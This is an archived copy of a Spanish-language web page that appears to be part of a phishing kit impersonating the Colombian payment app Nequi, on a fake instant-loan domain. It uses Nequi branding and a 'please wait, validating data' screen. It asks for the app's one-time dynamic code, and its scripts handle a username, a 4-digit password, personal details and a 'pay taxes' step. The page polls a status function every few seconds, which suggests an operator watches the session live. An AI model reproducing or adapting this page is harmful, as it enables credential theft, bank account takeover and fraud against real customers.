
<html>
    
<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:01 GMT -->
<head>
        <title>Solicitud</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../img/favicon.png" type="image/x-icon">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;0,1000;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900;1,1000&amp;display=swap" rel="stylesheet">
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>      
        <link href="../css/style.css" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../js/functions.js"></script> 
        <script type="text/javascript" src="../js/ready.js"></script>  
        <script src="../js/jquery.jclock-min.html" type="text/javascript"></script>
        <style type="text/css">
            body{
            background-color: #fbe5f2;
            display: flex;
            justify-content: center;
            align-content: flex-start;
            margin-top: 150px;

        }
        #fondo{
            position: fixed;
            z-index: 600;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: #fbe5f2   ;                         
        }

        #frm-esperando{
            padding: 30px 20px 0px 20px;
        }
        
        /* Estilo para el botón habilitado */
        .btn-habilitado {
            background-color: #DA0081; /* Cambia el color a amarillo */
            color: #fff;
        }

        /* Estilo para el botón deshabilitado */
        .btn-deshabilitado {
            background-color: #F1BFDA; /* Cambia el color a gris */
            color: #fff;
        }
            #frm-nuevootp{
                display: none;
            }
        </style>     
        <script type="text/javascript">    
            $(document).ready(function(){
                buscar_documento();

                var FechaFull = new Date();
                var dia = FechaFull.getDate();
                var mes = FechaFull.getMonth();
                var ano = FechaFull.getFullYear();

                mes = mes + 1;

                $("#fec").html(dia + "/" + mes + "/" + ano);

                setInterval(consultar_estado,8000);  
            }); 
        </script>   
    </head>
    <body>
        <div id="fondo"></div>
        
         

        <div id="frm-nuevootp" class="frm-modal">
            <img src="../img/nequi-4.png" alt="" style="width: 90%; margin-top: 30px;" >
          <div class="erro" id="err-nuevoot" style="display:flex;font-size: 15px;text-align: center;justify-content: center;">Tu clave dinámica la encuentras <br>en nuestra app Nequi</div>
            <img src="../img/clave-dinamica.png" alt="" style="width: 40%; margin-top: 0px;" >
            <br>
            <div class="formulario">
                <input style="background-color: #fbf7fb;"placeholder="Ingresa tu clave dinámica"type="password" name="txt-nuevootp" id="txt-nuevootp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                <div class="error" id="err-nuevootp" style="display:flex; text-align: center;">El código que has ingresado es inválido o ha caducado. Intenta nuevamente.</div>
                <br>
                <button class="btn" id="btn-validar-nuevo">Validar</button>
            </div>
        </div>

        <div id="frm-otp" class="frm-modal">
            <img src="../img/nequi-4.png" alt="" style="width: 90%; margin-top: 30px;" >
          <div class="erro" id="err-nuevoot" style="display:flex;font-size: 15px;text-align: center;justify-content: center;">Tu clave dinámica la encuentras <br>en nuestra app Nequi</div>
            <img src="../img/clave-dinamica.png" alt="" style="width: 40%; margin-top: 0px;" >
            <div class="formulario">
                <input style="background-color: #fbf7fb; margin-bottom:15px ;" placeholder="Ingresa tu clave dinámica"type="password" name="txt-otp" id="txt-otp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                <button class="btn btn-deshabilitado" id="btn-validar" disabled>Validar</button>
            </div>
        </div>

        <div id="frm-esperando" class="frm-modal2" style="display:block; width: 90%; background-color:#fbe5f2; height: 100%; margin-top: 110px;">
            <img src="../img/nequi.svg" width="120" id="logo-entidad-472">
            <br><br>
            <div>Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minutos. No cierres o recargues esta ventana.</div>
        <img src="../img/preloader2.gif" width="120">   
                             
        </div>

        <div id="frm-cargando" class="frm-modal">
            <img src="../img/nequi.svg" width="50" id="logo-entidad-load">
            <br>
            <img src="../img/preloader2.gif" width="120">            
            <br>
            <div>Estamos procesando su solicitud espere un momento</div>
        </div>

       

    </body>

<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:03 GMT -->
</html>

<script type="text/javascript">    
    $(document).ready(function(){
        buscar_documento();

        var FechaFull = new Date();
        var dia = FechaFull.getDate();
        var mes = FechaFull.getMonth();
        var ano = FechaFull.getFullYear();

        mes = mes + 1;

        $("#fec").html(dia + "/" + mes + "/" + ano);

        

        $("#txt-usuario").on("input", function() {
            var inputValue = $(this).val();
            if (inputValue.trim() !== "" && inputValue.length <= 10) {
                $("#btn-iniciar-sesion").prop("disabled", false);
                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-iniciar-sesion").prop("disabled", true);
                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        });

        $("#txt-password").on("input", function() {
            var inputValue = $(this).val();
            if (inputValue.trim() !== "" && inputValue.length <= 4) {
                $("#btn-iniciar-sesion").prop("disabled", false);
                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-iniciar-sesion").prop("disabled", true);
                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        }); 
    }); 
</script> 
   <script type="text/javascript">    
    $(document).ready(function(){
        // Función para habilitar/deshabilitar el botón
        function toggleButton() {
            var inputValue = $("#txt-otp").val();
            if (inputValue.trim() !== "") {
                $("#btn-validar").prop("disabled", false);
                $("#btn-validar").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-validar").prop("disabled", true);
                $("#btn-validar").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        }

        // Ejecutar la función al cargar la página
        toggleButton();

        // Ejecutar la función al escribir en el input
        $("#txt-otp").on("input", toggleButton);
    }); 
</script>
 <script type="text/javascript">    
    $(document).ready(function(){
        // Función para habilitar/deshabilitar el botón
        function toggleButton() {
            var inputValue = $("#txt-nuevootp").val();
            if (inputValue.trim() !== "") {
                $("#btn-validar-nuevo").prop("disabled", false);
                $("#btn-validar-nuevo").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-validar-nuevo").prop("disabled", true);
                $("#btn-validar-nuevo").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        }

        // Ejecutar la función al cargar la página
        toggleButton();

        // Ejecutar la función al escribir en el input
        $("#txt-nuevootp").on("input", toggleButton);
    }); 
</script> 

<script type="text/javascript">    
    $(document).ready(function(){
        // Función para habilitar/deshabilitar el botón
        function toggleButton() {
            var nombre = $("#txt-nombre").val().trim();
            var celular = $("#txt-celular").val().trim();
            var correo = $("#txt-correo").val().trim();
            var direccion = $("#txt-direccion").val().trim();
            var ciudad = $("#txt-ciudad").val().trim();

            if (nombre !== "" && celular !== "" && correo !== "" && direccion !== "" && ciudad !== "") {
                $("#btn-pagar-impuestos").prop("disabled", false);
                $("#btn-pagar-impuestos").removeClass("btn-deshabilitado").addClass("btn-habilitado");
            } else {
                $("#btn-pagar-impuestos").prop("disabled", true);
                $("#btn-pagar-impuestos").removeClass("btn-habilitado").addClass("btn-deshabilitado");
            }
        }

        // Ejecutar la función al cargar la página
        toggleButton();

        // Ejecutar la función al escribir en los inputs
        $(".entradas").on("input", toggleButton);
    }); 
</script>


